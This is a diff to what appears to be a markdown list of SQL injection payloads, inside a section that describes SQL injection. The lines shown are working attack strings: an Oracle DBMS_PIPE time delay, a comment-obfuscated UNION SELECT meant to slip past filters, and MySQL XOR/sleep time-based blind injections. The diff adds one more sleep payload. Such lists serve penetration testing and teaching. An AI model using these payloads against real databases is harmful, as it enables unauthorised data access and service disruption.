@@ -251,6 +251,7 @@ Consists of an insertion or "injection" of a SQL query via the input data from t
   orwa'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),10)||'
   -1+/*!12345UnIoN*//**/(/*!12345SEleCt*//**/ 1,2)+ — +
   0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
+  'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
   ```
 </details>
 
